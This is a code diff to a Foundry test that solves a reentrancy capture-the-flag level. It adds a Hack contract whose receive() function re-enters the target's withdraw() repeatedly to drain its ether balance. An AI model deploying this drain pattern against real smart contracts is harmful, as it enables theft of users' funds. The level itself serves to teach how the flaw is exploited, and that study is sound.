@@ -29,7 +29,8 @@ contract ReentranceTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        Hack hack = new Hack(levelAddress);
+        hack.hack{value: 1.001 ether}();
 
         /*****************
          *Level Submission*
@@ -39,5 +40,28 @@ contract ReentranceTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract Hack {
+    Reentrance public challenge;
+
+    // -- 1 --
+    constructor(address challengeAddress) {
+        challenge = Reentrance(payable(challengeAddress));
+    }
+
+    function hack() external payable {
+        // -- 2 --
+        challenge.donate{value: msg.value}(address(this));
+        challenge.withdraw(0.1 ether);
+    }
+
+    fallback() external payable {}
+
+    receive() external payable {
+        if (address(challenge).balance > 0) {
+            challenge.withdraw(address(challenge).balance > .15 ether ? .15 ether : address(challenge).balance);
+        }
     }
 }
